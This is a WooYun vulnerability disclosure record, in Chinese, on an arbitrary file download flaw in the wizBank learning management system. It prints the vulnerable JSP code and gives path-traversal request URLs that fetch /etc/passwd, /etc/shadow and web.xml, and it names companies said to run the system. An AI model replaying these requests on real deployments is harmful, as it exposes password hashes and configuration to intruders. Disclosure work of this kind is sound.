{"id": 82888, "wybug_id": "wooyun-2015-0149619", "wybug_title": "wizBank®学习管理系统任意文件下载漏洞", "wybug_corp": "汇思软件（上海）有限公司", "wybug_author": "紫苏叶", "wybug_date": "2015-10-28 10:40", "wybug_open_date": "2015-12-12 10:42", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-28：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-12-12：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： wizBank学习管理系统文件下载功能没有对下载的文件名称和类型进行严格检查和过滤，恶意用户可通过构造特殊的路径下载指定的文件。 详细说明：  wizBank学习管理系统的\\www\\cw\\skin1\\jsp\\download.jsp文件的源代码如下：\n<%@ page import=\"**.**.**.**.*\" %><%@ page import=\"**.**.**.**.*\" %><%@ page import=\"**.**.**.**.*\" %><%@ page import=\"java.util.*\" %><%@ page import=\"javax.servlet.*\" %><%\tString DOC_ROOT = request.getRealPath(\"/\");\tFile targetFile = new File (DOC_ROOT, request.getParameter(\"file\"));\tresponse.setContentType(\"application/stream\"); \tresponse.setHeader(\"Content-Disposition\",\"attachment; filename=\" + targetFile.getName() + \";\"); \tServletOutputStream fileOut = response.getOutputStream();    \tBufferedInputStream fif= new BufferedInputStream(new FileInputStream(targetFile.getAbsolutePath())); \t\tint data; \twhile((data = fif.read())!=-1) { \t\tfileOut.write(data); \t} \tfif.close(); \tfileOut.close(); %>\n，从代码可见，没有对下载的文件名称和类型进行严格检查和过滤，恶意用户可通过构造特殊的路径下载指定的文件。   漏洞证明：  如测试站点http://**.**.**.**:http://**.**.**.**/cw/skin1/jsp/download.jsp?file=../../../../etc/passwdhttp://**.**.**.**/cw/skin1/jsp/download.jsp?file=../../../../etc/shadow成功下载到/etc/password及/etc/shadow文件，如下图所示：\n\n\n\n测试官网示例站http://**.**.**.**/是否存在该漏洞，构造如下链接下载/WEB-INF/web.xml文件：http://**.**.**.**/cw/skin1/jsp/download.jsp?file=/WEB-INF/web.xml下载的文件如下图所示：\n\n网上查了下，使用该系统的企业还是挺多的，如：中国国际航空公司：**.**.**.**/加多宝：http://**.**.**.**/建发集团：**.**.**.**/青岛啤酒：**.**.**.**:8008/美的：http://**.**.**.**/真功夫：http://**.**.**.**/中国物业管理协会：**.**.**.**/安邦保险：http://**.**.**.**/雅培：http://**.**.**.**/重庆农村商业银行：**.**.**.**/安利:**.**.**.**/艾默生网络能源有限公司：http://**.**.**.**/牧原集团：**.**.**.**:8090/迈普：**.**.**.**:8080/浙江中控技术股份有限公司：http://**.**.**.**/广州风神物流：http://**.**.**.**/更多的就不列举了。   修复方案：  对文件下载功能的下载文件名称、类型及路径进行严格的检查和限制。   版权声明：转载请注明来源 紫苏叶@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}